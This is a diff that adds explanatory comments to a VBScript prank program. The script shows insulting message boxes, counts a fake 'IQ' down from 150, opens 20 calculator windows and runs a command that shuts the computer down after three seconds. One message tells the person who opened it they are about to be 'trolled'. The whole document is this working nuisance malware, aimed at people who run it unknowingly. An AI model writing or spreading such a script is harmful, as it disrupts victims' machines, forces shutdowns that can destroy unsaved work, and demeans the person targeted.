@@ -1,8 +1,8 @@
 Option Explicit
 
-Function one()
+Function one() 'step 1
     Dim a
-    Do
+    Do 'check if "a" is "i am stupid"
         If a="i am stupid" Then
             Exit Do
         Else
@@ -11,32 +11,32 @@ Function one()
     Loop
 End Function
 
-Function two()
+Function two() 'step 2
     Dim c
     c=150
-    Do until c=0
+    Do until c=0 'print user's IQ from 150 to 0
         MsgBox "your IQ is "&c,4096,"yep you are stupid"
         c=c-1
     Loop
 End Function
 
-Function three()
+Function three() 'step 3
     Dim yee,wsh
     yee=0
     Set wsh=wscript.createobject("wscript.shell")
-    Do Until yee=20
+    Do Until yee=20 'open 20 calculators
         wsh.run "calc"
         yee=yee+1
     Loop
 End Function
 
-Function four()
+Function four() 'step 4
     Dim WSHshell
     Set WSHshell=wscript.createobject("wscript.shell")
-    WSHshell.run "shutdown -s -t 3",0,true
+    WSHshell.run "shutdown -s -t 3",0,true 'shutdown the computer after 3 seconds
 End Function
 
-Do
+Do 'the way to ridicule
     MsgBox "well well well",4096,"yep you are stupid"
     MsgBox "i'm sorry for you for opening the program",4096,"yep you are stupid"
     MsgBox "are you ready to be trolled?",4096,"yep you are stupid"
